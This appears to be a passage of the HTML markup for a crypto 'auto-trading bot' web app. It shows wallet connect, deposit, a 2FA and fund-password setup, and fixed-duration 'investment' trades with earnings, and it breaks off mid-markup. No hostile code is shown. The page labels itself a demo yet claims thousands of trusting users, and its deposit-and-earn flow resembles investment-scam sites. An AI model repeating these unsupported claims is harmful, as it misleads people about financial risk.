<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
    <title>Blockchain Auto-Trading Bot</title>
    <meta name="theme-color" content="#0d0f14" />
    <link rel="manifest" href="data:application/manifest+json,
        %7B
        %22name%22:%22Blockchain%20Auto-Trading%20Bot%22,
        %22short_name%22:%22Bot%22,
        %22start_url%22:%22./%22,
        %22display%22:%22standalone%22,
        %22background_color%22:%22%230d0f14%22,
        %22theme_color%22:%22%230d0f14%22,
        %22description%22:%22A%20demo%20PWA%20for%20a%20blockchain%20auto-trading%20bot%20terminal%20with%20live%20data%20and%20simulated%20features.%22,
        %22icons%22:%5B
            %7B
            %22src%22:%221_Tw2u2Wy9h6splrhAbRHM_A-392650835.jpeg%22,
            %22sizes%22:%22512x512%22,
            %22type%22:%22image/jpeg%22
            %7D,
            %7B
            %22src%22:%221_Tw2u2Wy9h6splrhAbRHM_A-392650835.jpeg%22,
            %22sizes%22:%22192x192%22,
            %22type%22:%22image/jpeg%22
            %7D
        %5D
        %7D
    " />
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://s3.tradingview.com/tv.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/otplib@12.0.1/otplib.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
    <style>
        :root {
            --bg: #0d0f14;
            --panel: #11141b;
            --panel-2: #0f1218;
            --muted: #a0a7b4;
            --brand: #1ea7fd;
            --accent: #22c55e;
            --danger: #ef4444;
        }
        html, body {
            background: var(--bg);
            color: #fff;
            font-family: ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif;
        }
        .glass {
            background: linear-gradient(180deg, rgba(255, 255, 255, .06), rgba(255, 255, 255, .02));
            backdrop-filter: blur(10px);
        }
        .btn {
            @apply px-4 py-3 rounded-xl font-semibold;
            background: #1e293b;
        }
        .btn-primary {
            background: var(--brand);
        }
        .btn-primary:active {
            transform: translateY(1px);
        }
        .btn-ghost {
            background: transparent;
            border: 1px solid rgba(255, 255, 255, .08);
        }
        .tab-active {
            color: var(--brand);
        }
        .hidden-page {
            display: none;
        }
        .page {
            min-height: calc(100dvh - 64px - 64px);
        }
        .safe-note {
            font-size: .75rem;
            color: var(--muted);
        }
        .qr-placeholder {
            width: 128px;
            height: 128px;
            display: flex;
            align-items: center;
            justify-content: center;
            background-color: #333;
            color: #999;
            border-radius: 8px;
            font-size: 10px;
        }
    </style>
</head>
<body class="min-h-screen flex flex-col">

<script>
    if ('serviceWorker' in navigator) {
      window.addEventListener('load', () => {
        navigator.serviceWorker.register('/sw.js')
          .then(registration => console.log('SW registered: ', registration))
          .catch(registrationError => console.log('SW registration failed: ', registrationError));
      });
    }
</script>

<script id="sw-script" type="text/javascript">
    self.addEventListener('install', (event) => {
      event.waitUntil(
        caches.open('v1').then((cache) => {
          return cache.addAll([
            '/',
            '/index.html',
            // Pre-cache other assets like CSS and JS files
          ]);
        })
      );
    });
    self.addEventListener('fetch', (event) => {
      event.respondWith(
        caches.match(event.request).then((response) => {
          return response || fetch(event.request);
        })
      );
    });
</script>


<div id="modal" class="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50 hidden">
    <div class="bg-[var(--panel)] p-6 rounded-2xl shadow-xl max-w-sm mx-auto">
        <h3 id="modalTitle" class="text-xl font-bold mb-2"></h3>
        <p id="modalMessage" class="text-[var(--muted)] mb-4"></p>
        <button onclick="window.hideModal()" class="w-full btn-primary rounded-xl">OK</button>
    </div>
</div>

<div id="securityModal" class="fixed inset-0 bg-black bg-opacity-70 hidden items-center justify-center z-50 p-4">
  <div class="bg-gray-900 text-gray-100 rounded-xl w-full max-w-lg p-6 relative">
    <button id="closeSecurityModal" class="absolute top-4 right-4 text-gray-400 hover:text-white font-bold text-lg">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="w-6 h-6">
            <path fill-rule="evenodd" d="M5.47 5.47a.75.75 0 0 1 1.06 0L12 10.94l5.47-5.47a.75.75 0 1 1 1.06 1.06L13.06 12l5.47 5.47a.75.75 0 1 1-1.06 1.06L12 13.06l-5.47 5.47a.75.75 0 0 1-1.06-1.06L10.94 12 5.47 6.53a.75.75 0 0 1 0-1.06Z" clip-rule="evenodd" />
        </svg>
    </button>
    <h2 class="text-2xl font-bold mb-4">üîê Security Setup</h2>

    <div class="bg-gray-800 p-4 rounded-lg mb-4">
      <p><strong>User ID:</strong> <span id="modalUserId">USER-123456789</span></p>
      <p><strong>Username:</strong> <input type="text" id="modalUsername" readonly class="bg-gray-700 text-white rounded px-2 py-1 w-full mt-1"></p>
    </div>

    <label class="block font-semibold mb-1">Scan this QR Code in Google Authenticator:</label>
    <div id="modalQrCode" class="mb-2"></div>
    <div id="modalSecretKey" class="bg-gray-800 p-2 rounded mb-4"></div>

    <label class="block font-semibold mb-1">Enter 2FA Code:</label>
    <input type="number" id="modalCodeInput" placeholder="Enter 6-digit code" class="w-full mb-2 px-3 py-2 rounded bg-gray-800 text-white">
    <button id="verify2FABtn" class="w-full bg-blue-600 hover:bg-blue-700 py-2 rounded mb-2">Verify Code</button>
    <div id="verifyResult" class="mb-4"></div>

    <label class="block font-semibold mb-1">Set Fund Password:</label>
    <div class="flex mb-4">
      <input type="password" id="modalFundPassword" placeholder="Enter fund password" class="flex-grow px-3 py-2 rounded-l bg-gray-800 text-white">
      <button id="toggleFundPassword" class="bg-gray-700 px-3 rounded-r">
        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
            <path stroke-linecap="round" stroke-linejoin="round" d="M2.036 12.322a1.012 1.012 0 0 1 0-.639C3.423 7.51 7.36 4.5 12 4.5c4.638 0 8.575 3.01 9.963 7.822.08.31.08.636 0 .946-.628 2.083-2.614 4.54-4.885 5.617A10.655 10.655 0 0 1 12 17.25a10.655 10.655 0 0 1-5.078-1.12c-2.271-1.077-4.257-3.534-4.885-5.617ZM2.036 12.322a1.012 1.012 0 0 1 0-.639C3.423 7.51 7.36 4.5 12 4.5c4.638 0 8.575 3.01 9.963 7.822.08.31.08.636 0 .946-.628 2.083-2.614 4.54-4.885 5.617A10.655 10.655 0 0 1 12 17.25a10.655 10.655 0 0 1-5.078-1.12c-2.271-1.077-4.257-3.534-4.885-5.617ZM2.036 12.322a1.012 1.012 0 0 1 0-.639C3.423 7.51 7.36 4.5 12 4.5c4.638 0 8.575 3.01 9.963 7.822.08.31.08.636 0 .946-.628 2.083-2.614 4.54-4.885 5.617A10.655 10.655 0 0 1 12 17.25a10.655 10.655 0 0 1-5.078-1.12c-2.271-1.077-4.257-3.534-4.885-5.617Z" />
        </svg>
      </button>
    </div>

    <button id="saveSecurityBtn" class="w-full bg-green-600 hover:bg-green-700 py-2 rounded">Save Security Settings</button>
    <div id="saveResult" class="mt-2"></div>
  </div>
</div>

<header class="h-16 flex items-center justify-between px-4 border-b border-white/5 bg-[var(--panel)]">
    <div class="flex items-center gap-3">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="w-8 h-8 text-[var(--brand)]">
            <path d="M11.25 4.521a.75.75 0 0 1 .5.766L10.5 13.5h5.5a.75.75 0 0 1 .562 1.263l-7.25 8.25a.75.75 0 0 1-1.425-.129l-.25-2.25a.75.75 0 0 1 .942-.863l.36-.072a.5.5 0 0 0 .57-.614l-.624-3.573a.75.75 0 0 1 .91-.846l2.05-.183c.091.956.371 1.897.807 2.792a.75.75 0 0 1-1.168.932 7.502 7.502 0 0 1-.872-2.317l1.494.134a.5.5 0 0 0 .59-.57l-.36-.072a.75.75 0 0 1 .91-.846l2.128-.214a.75.75 0 0 1 .679.845l-4.07 7.102a.75.75 0 0 1-1.17-.417l.088-.41a.75.75 0 0 1 .86-.71zM11.25 10.5a.75.75 0 0 0 .75-.75V5.25a.75.75 0 0 0-1.5 0v4.5a.75.75 0 0 0 .75.75z" />
            <path fill-rule="evenodd" d="M12 2.25a9.75 9.75 0 1 0 0 19.5 9.75 9.75 0 0 0 0-19.5ZM1.821 12a10.125 10.125 0 0 1 17.592-7.561 9.793 9.793 0 0 0-1.282 3.843 8.25 8.25 0 0 0-8.22 8.22c-.64-.993-.972-2.115-.972-3.262ZM12 3.75c3.245 0 6.208 1.488 8.163 3.897A9.877 9.877 0 0 0 12 19.467 9.877 9.877 0 0 0 3.837 7.647 10.125 10.125 0 0 1 12 3.75Z" clip-rule="evenodd" />
        </svg>
        <div class="text-sm leading-tight">
            <div class="font-bold">Blockchain</div>
            <div id="netTag" class="text-[11px] text-[var(--muted)]">Disconnected</div>
        </div>
    </div>
    <div class="flex items-center gap-2">
        <button id="searchOpen" class="btn-ghost px-3 py-2 rounded-lg text-xs">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="w-6 h-6">
                <path fill-rule="evenodd" d="M10.5 3.75a6.75 6.75 0 1 0 0 13.5 6.75 6.75 0 0 0 0-13.5ZM2.25 10.5a8.25 8.25 0 1 1 14.59 5.28l4.68 4.68a.75.75 0 1 1-1.06 1.06l-4.68-4.68A8.25 8.25 0 0 1 2.25 10.5Z" clip-rule="evenodd" />
            </svg>
        </button>
        <button onclick="window.showModal('Coming Soon', 'Notifications are not yet implemented.')" class="btn-ghost px-3 py-2 rounded-lg text-xs">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="w-6 h-6">
                <path fill-rule="evenodd" d="M5.25 9a6.75 6.75 0 0 1 13.5 0v.75c0 2.123.8 4.057 2.118 5.52a.75.75 0 0 1-.297 1.206c-1.542.997-4.408 1.807-6.913 1.807-2.505 0-5.371-.81-6.913-1.807a.75.75 0 0 1-.297-1.206A8.256 8.256 0 0 0 5.25 9.75V9Z" clip-rule="evenodd" />
                <path d="M10.967 18.84a.75.75 0 0 0-1.934 0 3.001 3.001 0 0 0-2.32 2.632.75.75 0 0 0 .737.747l.79-.039a.75.75 0 0 0 .584-.585 1.5 1.5 0 0 1 2.998 0 .75.75 0 0 0 .585.585l.79.04a.75.75 0 0 0 .736-.748 3.001 3.001 0 0 0-2.32-2.632Z" />
            </svg>
        </button>
    </div>
</header>

<main class="flex-1">
    <section id="landing" class="page px-4 py-4 space-y-5">
        <div class="rounded-2xl p-5 glass">
            <img alt="Blockchain Auto-Trading Bot Logo" class="w-full h-auto mb-4 rounded-lg" src="1_Tw2u2Wy9h6splrhAbRHM_A-392650835.jpeg" />
            <h1 class="text-2xl font-bold">Welcome to the Bot</h1>
            <p class="text-[var(--muted)]">Live market data, wallet connect demo, and charts ‚Äî packaged as an installable PWA.</p>
            <div class="mt-4 grid grid-cols-2 gap-2">
                <button id="connectWalletBtn" class="btn-primary rounded-xl">Connect Wallet</button>
                <button id="getAppBtn" class="btn-ghost rounded-xl">GET APP</button>
            </div>
            <p class="safe-note mt-2">This demo is for educational UI only. Do not send funds.</p>
        </div>
        <div class="rounded-2xl p-5 bg-[var(--panel)]">
            <div class="flex items-center justify-between mb-3">
                <h2 class="font-semibold">Market Overview</h2>
                <button id="refreshMarket" class="text-xs text-[var(--muted)]">Refresh</button>
            </div>
            <div id="marketList" class="divide-y divide-white/5"></div>
        </div>
        <section id="how-it-works" class="px-4 py-4 space-y-4">
            <h2 class="text-xl font-bold text-center text-[var(--brand)]">How It Works</h2>
            <div class="rounded-2xl p-5 bg-[var(--panel)] space-y-4">
                <div class="flex items-start gap-4">
                    <div class="text-2xl font-bold text-[var(--accent)]">1.</div>
                    <div>
                        <h3 class="text-lg font-semibold">Connect Your Wallet</h3>
                        <p class="text-sm text-[var(--muted)]">Securely link your existing crypto wallet. Your private keys never leave your wallet.</p>
                    </div>
                </div>
                <div class="flex items-start gap-4">
                    <div class="text-2xl font-bold text-[var(--accent)]">2.</div>
                    <div>
                        <h3 class="text-lg font-semibold">Explore Markets</h3>
                        <p class="text-sm text-[var(--muted)]">Dive into our comprehensive market overview with real-time price updates and interactive charts.</p>
                    </div>
                </div>
                <div class="flex items-start gap-4">
                    <div class="text-2xl font-bold text-[var(--accent)]">3.</div>
                    <div>
                        <h3 class="text-lg font-semibold">Trade & Manage</h3>
                        <p class="text-sm text-[var(--muted)]">Effortlessly execute simulated buy and sell orders, track your portfolio performance, and view your transaction history.</p>
                    </div>
                </div>
            </div>
        </section>
        <section id="cta-section" class="px-4 py-4 text-center bg-[var(--panel-2)] rounded-2xl">
            <h2 class="text-xl font-bold text-[var(--brand)] mb-2">Ready to Get Started?</h2>
            <p class="text-sm text-[var(--muted)] mb-4">Join thousands of users who trust this platform for their crypto trading and portfolio management needs.</p>
            <button id="cta-connect-wallet-btn" class="btn-primary rounded-xl">Connect Wallet & Start Trading</button>
        </section>
        <section id="faq" class="px-4 py-4 space-y-4">
            <h2 class="text-xl font-bold text-center text-[var(--brand)]">Frequently Asked Questions</h2>
            <div class="space-y-3">
                <details class="bg-[var(--panel)] p-4 rounded-xl">
                    <summary class="font-semibold text-white cursor-pointer">What is this platform?</summary>
                    <p class="text-sm text-[var(--muted)] mt-2">This is a sophisticated crypto terminal that allows you to track market data, connect your wallet, and simulate crypto trades in real-time. It is a demo for educational purposes.</p>
                </details>
                <details class="bg-[var(--panel)] p-4 rounded-xl">
                    <summary class="font-semibold text-white cursor-pointer">Is my wallet secure?</summary>
                    <p class="text-sm text-[var(--muted)] mt-2">Yes, we use industry-standard secure connection methods. Your private keys never leave your wallet.</p>
                </details>
                <details class="bg-[var(--panel)] p-4 rounded-xl">
                    <summary class="font-semibold text-white cursor-pointer">Do you support real trading?</summary>
                    <p class="text-sm text-[var(--muted)] mt-2">Currently, this platform provides a simulation environment for trading. It's perfect for practicing strategies without real financial risk. No real orders are placed and no real funds are used.</p>
                </details>
            </div>
        </section>
    </section>

    <section id="loading" class="page px-4 py-8 hidden-page">
        <div class="flex flex-col items-center justify-center gap-4 mt-20">
            <svg class="animate-spin h-10 w-10 text-[var(--brand)]" viewBox="0 0 24 24">
                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"></path>
            </svg>
            <div class="text-sm text-[var(--muted)]">Setting up your session...</div>
        </div>
    </section>

    <section id="home" class="page px-4 py-4 hidden-page space-y-4">
        <div class="rounded-2xl p-5 bg-[var(--panel)]">
            <div class="text-xs text-[var(--muted)]">Total Portfolio</div>
            <div id="totalBalance" class="text-3xl font-bold">$0.00</div>
            <div class="mt-4 flex gap-2">
                <button onclick="window.showPage('deposit'); window.startDepositFlow()" class="btn-primary rounded-xl flex items-center gap-2">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="w-6 h-6">
                        <path d="M4.5 3.75a3 3 0 0 0-3 3v.75h21v-.75a3 3 0 0 0-3-3h-15Z" />
                        <path fill-rule="evenodd" d="M22.5 9.75h-21v7.5a3 3 0 0 0 3 3h15a3 3 0 0 0 3-3v-7.5Zm-18 2.25a.75.75 0 0 1 .75-.75h6a.75.75 0 0 1 0 1.5h-6a.75.75 0 0 1-.75-.75Zm.75 2.25a.75.75 0 0 0 0 1.5h3a.75.75 0 0 0 0-1.5h-3Z" clip-rule="evenodd" />
                    </svg>
                    Deposit
                </button>
                <button onclick="window.showPage('swap')" class="btn-ghost rounded-xl flex items-center gap-2">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="w-6 h-6">
                        <path d="M11.75 11.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v3.5a.75.75 0 0 1-1.5 0V12h-2.5a.75.75 0 0 1-.75-.75Z" />
                        <path fill-rule="evenodd" d="M12.5 3.25a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4a.75.75 0 0 1 .75-.75Zm3.36 2.012a.75.75 0 0 1-.842.175l-2.617-1.164a.75.75 0 0 1 .175-.842l2.617-1.164a.75.75 0 0 1 .667.147.75.75 0 0 1 .175.842l-2.617 1.164a.75.75 0 0 1-.175.842Z" clip-rule="evenodd" />
                        <path fill-rule="evenodd" d="M12.25 12.5a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v3.5a.75.75 0 0 1-1.5 0V13h-2.5a.75.75 0 0 1-.75-.75Z" />
                        <path d="M11.75 12.25a.75.75 0 0 1-.75-.75V8a.75.75 0 0 1 1.5 0v3.5a.75.75 0 0 1-.75.75Z" />
                        <path fill-rule="evenodd" d="M12.5 12.5a.75.75 0 0 1 .75.75v3.5a.75.75 0 0 1-1.5 0v-3.5a.75.75 0 0 1 .75-.75Z" clip-rule="evenodd" />
                        <path d="M11.75 11.25a.75.75 0 0 1-.75-.75V8a.75.75 0 0 1 1.5 0v2.5a.75.75 0 0 1-.75.75Z" />
                        <path d="M12.5 12.5a.75.75 0 0 1 .75-.75v3.5a.75.75 0 0 1-1.5 0v-3.5a.75.75 0 0 1 .75-.75Z" />
                    </svg>
                    Swap
                </button>
                <button onclick="window.showPage('send')" class="btn-ghost rounded-xl flex items-center gap-2">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="w-6 h-6">
                        <path d="M9.75 9.75a.75.75 0 0 1 1.5 0v3.5a.75.75 0 0 1-1.5 0v-3.5Z" />
                        <path fill-rule="evenodd" d="M12 2.25c-5.385 0-9.75 4.365-9.75 9.75s4.365 9.75 9.75 9.75 9.75-4.365 9.75-9.75S17.385 2.25 12 2.25Zm0 18a8.25 8.25 0 1 0 0-16.5 8.25 8.25 0 0 0 0 16.5Zm-.75-10.5a.75.75 0 0 1 1.5 0v3.5a.75.75 0 0 1-1.5 0v-3.5Z" clip-rule="evenodd" />
                        <path d="M9.75 9.75a.75.75 0 0 1 1.5 0v3.5a.75.75 0 0 1-1.5 0v-3.5Z" />
                    </svg>
                    Send
                </button>
            </div>
        </div>
        
        <div class="rounded-2xl p-5 bg-[var(--panel)]">
            <div class="text-xs text-[var(--muted)]">Account ID</div>
            <div id="homeAccountId" class="text-sm break-all font-mono"></div>
        </div>

        <div class="rounded-2xl p-5 bg-[var(--panel)]">
            <div class="flex items-center justify-between mb-3">
                <h2 class="font-semibold">Performance (BTCUSD)</h2>
                <span class="text-[var(--muted)] text-xs">TradingView</span>
            </div>
            <div id="tv_chart" style="height:360px;"></div>
        </div>

        <div class="rounded-2xl p-5 bg-[var(--panel)]">
            <div class="flex items-center justify-between mb-3">
                <h2 class="font-semibold">Top Movers (24h)</h2>
                <button id="refreshMovers" class="text-xs text-[var(--muted)]">Refresh</button>
            </div>
            <div id="moversList" class="divide-y divide-white/5"></div>
        </div>
    </section>

    <section id="discover" class="page px-4 py-4 hidden-page space-y-4">
        <div class="rounded-2xl p-5 bg-[var(--panel)]">
            <div class="flex items-center justify-between mb-3">
                <h2 class="font-semibold">Discover</h2>
                <button id="searchOpen2" class="btn-ghost rounded-lg text-xs">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="w-6 h-6">
                        <path fill-rule="evenodd" d="M10.5 3.75a6.75 6.75 0 1 0 0 13.5 6.75 6.75 0 0 0 0-13.5ZM2.25 10.5a8.25 8.25 0 1 1 14.59 5.28l4.68 4.68a.75.75 0 1 1-1.06 1.06l-4.68-4.68A8.25 8.25 0 0 1 2.25 10.5Z" clip-rule="evenodd" />
                    </svg>
                </button>
            </div>
            <div id="discoverFeed" class="space-y-3"></div>
        </div>
    </section>

    <section id="trade" class="page px-4 py-4 hidden-page space-y-4">
        <div class="rounded-2xl p-5 bg-[var(--panel)]">
            <div class="flex items-center justify-between">
                <h2 class="font-semibold">Trade</h2>
                <button onclick="window.showPage('trade-chart')" class="btn-ghost rounded-lg text-xs">View Chart</button>
            </div>
            
            <div class="mt-4 grid gap-4">
                <div class="flex flex-col gap-2">
                    <label for="tradeAssetSelect" class="text-sm text-[var(--muted)]">Select Asset:</label>
                    <select id="tradeAssetSelect" class="w-full px-4 py-3 rounded-xl bg-[var(--panel-2)] border border-white/10 focus:outline-none focus:border-[var(--brand)] transition-colors"></select>
                </div>
                <div class="flex flex-col gap-2">
                    <label for="tradeDuration" class="text-sm text-[var(--muted)]">Trade Duration (months):</label>
                    <select id="tradeDuration" class="w-full px-4 py-3 rounded-xl bg-[var(--panel-2)] border border-white/10 focus:outline-none focus:border-[var(--brand)] transition-colors">
                        <option value="1">1 month</option>
                        <option value="2">2 months</option>
                        <option value="3">3 months</option>
                        <option value="4">4 months</option>
                        <option value="5">5 months</option>
                        <option value="6">6 months</option>
                        <option value="7">7 months</option>
                        <option value="8">8 months</option>
                        <option value="9">9 months</option>
                        <option value="10">10 months</option>
                        <option value="11">11 months</option>
                        <option value="12">12 months</option>
                    </select>
                </div>
                <div class="flex flex-col gap-2">
                    <label for="tradeAmount" class="text-sm text-[var(--muted)]">Investment Amount ($):</label>
                    <input type="number" id="tradeAmount" placeholder="Enter investment amount" class="w-full px-4 py-3 rounded-xl bg-[var(--panel-2)] border border-white/10 focus:outline-none focus:border-[var(--brand)] transition-colors">
                </div>
                <button id="startTradeBtn" class="btn-primary rounded-xl">Place Trade</button>
            </div>
            
            <div id="tradeInfo" class="mt-6 rounded-xl p-4 bg-[var(--panel-2)]">
                <div class="flex justify-between items-center text-sm">
                    <span class="text-[var(--muted)]">Trade Account Balance:</span>
                    <span id="tradeBalance" class="font-semibold">$0.00</span>
                </div>
                <div class="flex justify-between items-center text-sm mt-2">
                    <span class="text-[var(--muted)]">Total Earnings:</span>
                    <span id="tradeEarnings" class="font-semibold">$0.00</span>
                </div>
                <div class="mt-4 grid grid-cols-2 gap-2">
                    <button onclick="window.showPage('transfer')" class="btn-ghost rounded-xl">
                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="w-6 h-6">
                            <path d="M11.75 11.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v3.5a.75.75 0 0 1-1.5 0V12h-2.5a.75.75 0 0 1-.75-.75Z" />
                            <path fill-rule="evenodd" d="M12.5 3.25a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4a.75.75 0 0 1 .75-.75Zm3.36 2.012a.75.75 0 0 1-.842.175l-2.617-1.164a.75.75 0 0 1 .175-.842l2.617-1.164a.75.75 0 0 1 .667.147.75.75 0 0 1 .175.842l-2.617 1.164a.75.75 0 0 1-.175.842Z" clip-rule="evenodd" />
                            <path fill-rule="evenodd" d="M12.25 12.5a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v3.5a.75.75 0 0 1-1.5 0V13h-2.5a.75.75 0 0 1-.75-.75Z" clip-rule="evenodd" />
                            <path d="M11.75 12.25a.75.75 0 0 1-.75-.75V8a.75.75 0 0 1 1.5 0v3.5a.75.75 0 0 1-.75.75Z" />
                            <path fill-rule="evenodd" d="M12.5 12.5a.75.75 0 0 1 .75.75v3.5a.75.75 0 0 1-1.5 0v-3.5a.75.75 0 0 1 .75-.75Z" clip-rule="evenodd" />
                            <path d="M11.75 11.25a.75.75 0 0 1-.75-.75V8a.75.75 0 0 1 1.5 0v2.5a.75.75 0 0 1-.75.75Z" />
                            <path d="M12.5 12.5a.75.75 0 0 1 .75-.75v3.5a.75.75 0 0 1-1.5 0v-3.5a.75.75 0 0 1 .75-.75Z" />
                        </svg>
                        Transfer
                    </button>
                    <button onclick="window.showModal('Coming Soon', 'Earnings history is a UI-only demo.')" class="btn-ghost rounded-xl">
                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="w-6 h-6">
                            <path d="M21.721 12.752a.75.75 0 0 0-.094-.508l-3.235-4.502a.75.75 0 0 0-1.29.544l.438 2.373H13.75c-.621 0-1.125.504-1.125 1.125v4.5c0 .621.504 1.125 1.125 1.125h3.818l-.438 2.373a.75.75 0 0 0 1.29.544l3.235-4.502a.75.75 0 0 0 .094-.508ZM12 12.75a.75.75 0 0 0-.75-.75H10.5V6.75a.75.75 0 0 0-.75-.75H5.25a.75.75 0 0 0-.75.75v8.25a.75.75 0 0 0 .75.75h4.5a.75.75 0 0 0 .75-.75v-1.25H10.5a.75.75 0 0 0 .75-.75v-.75Z" />
                            <path fill-rule="evenodd" d="M.721 12.752a.75.75 0 0 1 0-.508l3.235-4.502a.75.75 0 0 1 1.29.544l-.438 2.373h4.636c.621 0 1.125.504 1.125 1.125v4.5c0 .621-.504 1.125-1.125 1.125H4.808l.438 2.373a.75.75 0 0 1-1.29.544L.72 13.252a.75.75 0 0 1 0-.508Z" clip-rule="evenodd" />
                        </svg>
                        Earnings
                    </button>
                </div>
            </div>
            <p class="safe-note mt-4">This is a non-custodial demo UI. No real orders are placed.</p>
        </div>
    </section>

    <section id="trade-chart" class="page px-4 py-4 hidden-page space-y-4">
        <div class="rounded-2xl p-5 bg-[var(--panel)]">
            <div class="flex items-center justify-between">
                <h2 class="font-semibold">Performance Chart</h2>
                <button onclick="window.showPage('trade')" class="btn-ghost rounded-lg text-xs">Back</button>
            </div>
            <div id="tradeChart" style="height:360px;" class="mt-4"></div>
        </div>
    </section>

    <section id="swap" class="page px-4 py-4 hidden-page space-y-4">
        <div class="rounded-2xl p-5 bg-[var(--panel)]">
            <div class="flex items-center justify-between">
                <h2 class="font-semibold">Swap</h2>
                <button onclick="window.showPage('home')" class="btn-ghost rounded-lg text-xs">Back</button>
            </div>
            <div id="swap-ui" class="mt-4 grid gap-4">
                <div class="bg-[var(--panel-2)] p-4 rounded-xl">
                    <div class="text-sm text-[var(--muted)]">From:</div>
                    <select id="swapFromSelect" class="w-full mt-2 px-3 py-2 rounded-lg bg-[var(--panel-2)] border border-white/10"></select>
                    <input type="number" id="swapFromAmount" placeholder="0.0" class="w-full mt-2 px-3 py-2 rounded-lg bg-[var(--panel-2)] border-none focus:outline-none text-xl" />
                </div>
                <div class="flex justify-center -mt-6 -mb-6 z-10">
                    <button class="bg-[var(--brand)] p-2 rounded-full border border-white/10">
                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="w-6 h-6">
                            <path d="M19.5 7.5a.75.75 0 0 0-1.5 0v8.25H16.5a.75.75 0 0 0 0 1.5h2.25v2.25a.75.75 0 0 0 1.5 0v-2.25H21a.75.75 0 0 0 0-1.5h-1.5V7.5ZM5.25 18a.75.75 0 0 0 1.5 0V7.5H7.5a.75.75 0 0 0 0-1.5h-2.25V3.75a.75.75 0 0 0-1.5 0v2.25H3a.75.75 0 0 0 0 1.5h1.5v8.25Z" />
                        </svg>
                    </button>
                </div>
                <div class="bg-[var(--panel-2)] p-4 rounded-xl">
                    <div class="text-sm text-[var(--muted)]">To:</div>
                    <select id="swapToSelect" class="w-full mt-2 px-3 py-2 rounded-lg bg-[var(--panel-2)] border border-white/10"></select>
                    <input type="text" id="swapToAmount" placeholder="0.0" readonly class="w-full mt-2 px-3 py-2 rounded-lg bg-[var(--panel-2)] border-none focus:outline-none text-xl" />
                </div>
                <button id="swapBtn" class="btn-primary rounded-xl">Swap</button>
                <div id="swap-info" class="text-sm text-center text-[var(--muted)] mt-2"></div>
            </div>
        </div>
    </section>

    <section id="memes" class="page px-4 py-4 hidden-page space-y-4">
        <div class="rounded-2xl p-5 bg-[var(--panel)]">
            <h2 class="font-semibold mb-3">Trending (CoinGecko)</h2>
            <div id="memeList" class="space-y-3"></div>
        </div>
    </section>

    <section id="settings" class="page px-4 py-4 hidden-page space-y-4">
        <div class="rounded-2xl p-5 bg-[var(--panel)]">
            <h2 class="font-semibold mb-3">Account Settings</h2>
            
            <div class="text-sm text-[var(--muted)]">Wallet Address</div>
            <div id="accountWalletAddress" class="font-mono text-sm break-all">‚Äî</div>
            
            <div class="mt-2 text-sm text-[var(--muted)]">Wallet Balance</div>
            <div id="accountWalletBalance" class="font-mono text-sm break-all">0 ETH</div>

            <div class="mt-4 text-sm text-[var(--muted)]">Account ID</div>
            <div id="accountId" class="font-mono text-sm break-all">‚Äî</div>

            <div class="mt-4 flex flex-col gap-2">
                <button onclick="window.openWalletModal()" class="btn-ghost rounded-xl">
                    <div class="flex items-center gap-2">
                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="w-6 h-6">
                            <path d="M4.5 3.75a3 3 0 0 0-3 3v.75h21v-.75a3 3 0 0 0-3-3h-15Z" />
                            <path fill-rule="evenodd" d="M22.5 9.75h-21v7.5a3 3 0 0 0 3 3h15a3 3 0 0 0 3-3v-7.5Zm-18 2.25a.75.75 0 0 1 .75-.75h6a.75.75 0 0 1 0 1.5h-6a.75.75 0 0 1-.75-.75Zm.75 2.25a.75.75 0 0 0 0 1.5h3a.75.75 0 0 0 0-1.5h-3Z" clip-rule="evenodd" />
                        </svg>
                        Connected Wallet
                    </div>
                </button>
                <button id="disconnectBtn" class="btn-ghost rounded-xl text-[var(--danger)] border border-[var(--danger)]">
                    <div class="flex items-center gap-2">
                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="w-6 h-6">
